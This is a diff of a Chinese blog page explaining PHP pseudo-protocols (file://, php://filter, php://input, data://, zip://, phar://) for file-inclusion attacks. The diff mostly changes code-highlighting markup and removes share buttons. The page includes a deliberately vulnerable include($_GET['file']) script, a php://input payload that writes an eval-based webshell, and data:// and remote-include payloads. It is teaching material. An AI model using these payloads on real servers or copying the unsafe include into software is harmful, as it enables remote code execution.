@@ -113,30 +113,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/04/27/17%20Vulnhub%20Pyexp%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&text=PHP伪协议"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&title=PHP伪协议"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&is_video=false&description=PHP伪协议"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=PHP伪协议&body=Check out this article: https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&title=PHP伪协议"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&title=PHP伪协议"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&title=PHP伪协议"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&title=PHP伪协议"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&name=PHP伪协议&description=&lt;p&gt;关于PHP伪协议的记录。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/04/29/PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE/&t=PHP伪协议"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">1. 简介</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#file-%E5%8D%8F%E8%AE%AE"><span class="toc-number">2.</span> <span class="toc-text">2. file:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#php-%E5%8D%8F%E8%AE%AE"><span class="toc-number">3.</span> <span class="toc-text">3. php:&#x2F;&#x2F; 协议</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#phpinput"><span class="toc-number">3.1.</span> <span class="toc-text">3.1. php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpoutput"><span class="toc-number">3.2.</span> <span class="toc-text">3.2. php:&#x2F;&#x2F;output</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpfd"><span class="toc-number">3.3.</span> <span class="toc-text">3.3. php:&#x2F;&#x2F;fd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmemory-phptemp"><span class="toc-number">3.4.</span> <span class="toc-text">3.4. php:&#x2F;&#x2F;memory, php:&#x2F;&#x2F;temp</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpfilter"><span class="toc-number">3.5.</span> <span class="toc-text">3.5. php:&#x2F;&#x2F;filter ⭐</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpfilter%E5%8F%82%E6%95%B0%E8%AF%A6%E8%A7%A3"><span class="toc-number">3.5.1.</span> <span class="toc-text">3.5.1. php:&#x2F;&#x2F;filter参数详解</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%AF%E7%94%A8%E7%9A%84%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">3.5.2.</span> <span class="toc-text">3.5.2. 可用的过滤器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%B8%E7%94%A8%E7%A4%BA%E4%BE%8B"><span class="toc-number">3.5.3.</span> <span class="toc-text">3.5.3. 常用示例</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#data-%E5%8D%8F%E8%AE%AE"><span class="toc-number">4.</span> <span class="toc-text">4. data:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#zip-bzip2-zlib-%E5%8D%8F%E8%AE%AE"><span class="toc-number">5.</span> <span class="toc-text">5. zip:&#x2F;&#x2F; &amp; bzip2:&#x2F;&#x2F; &amp; zlib:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http-https-%E5%8D%8F%E8%AE%AE"><span class="toc-number">6.</span> <span class="toc-text">6. http:&#x2F;&#x2F; &amp; https:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#phar-%E5%8D%8F%E8%AE%AE"><span class="toc-number">7.</span> <span class="toc-text">7. phar:&#x2F;&#x2F; 协议</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">8.</span> <span class="toc-text">8. 总结</span></a></li></ol>
     </div>
@@ -163,8 +145,6 @@
     <div class="postdate">
       
         <time datetime="2022-04-28T16:00:00.000Z" itemprop="datePublished">2022-04-29</time>
-        
-        (Updated: <time datetime="2022-04-29T03:59:13.791Z" itemprop="dateModified">2022-04-29</time>)
         
       
     </div>
@@ -193,33 +173,13 @@
 <span id="more"></span>
 <h1 id="简介">1. 简介</h1>
 <p>PHP 带有很多内置 URL 风格的封装协议，可用于类似 fopen()、 copy()、 file_exists() 和 filesize() 的文件系统函数。 除了这些封装协议，还能通过 stream_wrapper_register() 来注册自定义的封装协议。</p>
-<p>php中支持的伪协议有： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token number">1.</span> file<span class="token punctuation">:</span><span class="token comment">// — 访问本地文件系统</span>
-<span class="token number">2.</span> http<span class="token punctuation">:</span><span class="token comment">// — 访问 HTTP(s) 网址</span>
-<span class="token number">3.</span> ftp<span class="token punctuation">:</span><span class="token comment">// — 访问 FTP(s) </span>
-<span class="token number">4.</span> URLsphp<span class="token punctuation">:</span><span class="token comment">// — 访问各个输入/输出流（I/O streams）</span>
-<span class="token number">5.</span> zlib<span class="token punctuation">:</span><span class="token comment">// — 压缩流</span>
-<span class="token number">6.</span> data<span class="token punctuation">:</span><span class="token comment">// — 数据（RFC 2397）</span>
-<span class="token number">7.</span> glob<span class="token punctuation">:</span><span class="token comment">// — 查找匹配的文件路径模式</span>
-<span class="token number">8.</span> phar<span class="token punctuation">:</span><span class="token comment">// — PHP 归档</span>
-<span class="token number">9.</span> ssh2<span class="token punctuation">:</span><span class="token comment">// — Secure Shell 2</span>
-<span class="token number">10.</span> rar<span class="token punctuation">:</span><span class="token comment">// — RAR</span>
-<span class="token number">11.</span> ogg<span class="token punctuation">:</span><span class="token comment">// — 音频流</span>
-<span class="token number">12.</span> expect<span class="token punctuation">:</span><span class="token comment">// — 处理交互式的流</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>php中支持的伪协议有： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>. file:<span class="comment">// — 访问本地文件系统</span></span><br><span class="line"><span class="number">2</span>. http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line"><span class="number">3</span>. ftp:<span class="comment">// — 访问 FTP(s) </span></span><br><span class="line"><span class="number">4</span>. URLsphp:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line"><span class="number">5</span>. zlib:<span class="comment">// — 压缩流</span></span><br><span class="line"><span class="number">6</span>. data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line"><span class="number">7</span>. glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line"><span class="number">8</span>. phar:<span class="comment">// — PHP 归档</span></span><br><span class="line"><span class="number">9</span>. ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line"><span class="number">10</span>. rar:<span class="comment">// — RAR</span></span><br><span class="line"><span class="number">11</span>. ogg:<span class="comment">// — 音频流</span></span><br><span class="line"><span class="number">12</span>. expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure></p>
 <p>官方文档：</p>
 <ul>
 <li><a target="_blank" rel="noopener" href="https://www.php.net/manual/zh/wrappers.php">PHP: 支持的协议和封装协议 - Manual</a></li>
 </ul>
-<p>演示的代码如下： <pre class="line-numbers language-php" data-language="php"><code class="language-php">// test/test.php
-<span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
-	<span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'please give a param named file by GET!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span>
-?><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
-<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">// D:\phpStudy2018\PHPTutorial\WWW\test\test.txt
-hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>演示的代码如下： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// test/test.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">&#x27;please give a param named file by GET!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">// D:\phpStudy2018\PHPTutorial\WWW\test\test.txt</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>
 <h1 id="file-协议">2. file:// 协议</h1>
 <p>作用：</p>
 <ul>
@@ -391,7 +351,7 @@ hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span
 <li>allow_url_include: On</li>
 </ul>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429104901.png" /></p>
-<p>还可以写入一句话木马 <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">fputs</span><span class="token punctuation">(</span><span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'1juhua.php'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'&lt;?php @eval($_GET[cmd]); ?>'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>还可以写入一句话木马 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> fputs(fopen(<span class="string">&#x27;1juhua.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_GET[cmd]); ?&gt;&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105017.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429105035.png" /></p></li>
 </ol>
@@ -405,8 +365,7 @@ hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span
 <li>allow_url_fopen: On</li>
 <li>allow_url_include: On</li>
 </ul>
-<p>用法： <pre class="line-numbers language-none"><code class="language-none">1. data:&#x2F;&#x2F;text&#x2F;plain,
-2. data:&#x2F;&#x2F;text&#x2F;plain;base64,<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>用法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1. data://text/plain,</span><br><span class="line">2. data://text/plain;base64,</span><br></pre></td></tr></table></figure></p>
 <p>示例：</p>
 <ol type="1">
 <li><p><code>?file=data://text/plain,&lt;?php%20phpinfo();?&gt;</code></p>
@@ -448,19 +407,13 @@ hello world<span aria-hidden="true" class="line-numbers-rows"><span></span><span
 <li>allow_uyrl_fopen: On</li>
 <li>allow_url_include: On</li>
 </ul>
-<p>用法： <pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;example.com
-http:&#x2F;&#x2F;example.com&#x2F;file.php?var1&#x3D;val1&amp;var2&#x3D;val2
-http:&#x2F;&#x2F;user:password@example.com
-https:&#x2F;&#x2F;example.com
-https:&#x2F;&#x2F;example.com&#x2F;file.php?var1&#x3D;val1&amp;var2&#x3D;val2
-https:&#x2F;&#x2F;user:password@example.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>用法： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://example.com</span><br><span class="line">http://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">http://user:password@example.com</span><br><span class="line">https://example.com</span><br><span class="line">https://example.com/file.php?var1=val1&amp;var2=val2</span><br><span class="line">https://user:password@example.com</span><br></pre></td></tr></table></figure></p>
 <p>示例：</p>
 <p><code>http://localhost/test/test.php?file=http://127.0.0.1/index.php</code></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115152.png" /></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220429115222.png" /></p>
 <h1 id="phar-协议">7. phar:// 协议</h1>
-<p>phar:// 协议与 zip:// 类似，同样可以访问zip格式压缩包内容。但是格式与zip://不同，两者格式对比： <pre class="line-numbers language-none"><code class="language-none">zip:&#x2F;&#x2F;  -&gt; zip:&#x2F;&#x2F;&#123;压缩文件绝对路径&#125;%23&#123;压缩文件内的子文件名&#125;
-phar:&#x2F;&#x2F; -&gt; phar:&#x2F;&#x2F;&#123;压缩文件绝对路径\压缩文件内的子文件名&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
+<p>phar:// 协议与 zip:// 类似，同样可以访问zip格式压缩包内容。但是格式与zip://不同，两者格式对比： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">zip://  -&gt; zip://&#123;压缩文件绝对路径&#125;%23&#123;压缩文件内的子文件名&#125;</span><br><span class="line">phar:// -&gt; phar://&#123;压缩文件绝对路径\压缩文件内的子文件名&#125;</span><br></pre></td></tr></table></figure></p>
 <p>相同的：</p>
 <ul>
 <li><strong>两者都对压缩包的后缀名不敏感</strong>。</li>
@@ -529,7 +482,6 @@ phar:&#x2F;&#x2F; -&gt; phar:&#x2F;&#x2F;&#123;压缩文件绝对路径\压缩�
     <div id="actions-footer">
         <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fas fa-bars fa-lg" aria-hidden="true"></i> 菜单</a>
         <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fas fa-list fa-lg" aria-hidden="true"></i> 目录</a>
-        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fas fa-share-alt fa-lg" aria-hidden="true"></i> 分享</a>
         <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up fa-lg" aria-hidden="true"></i> 返回顶部</a>
     </div>
 
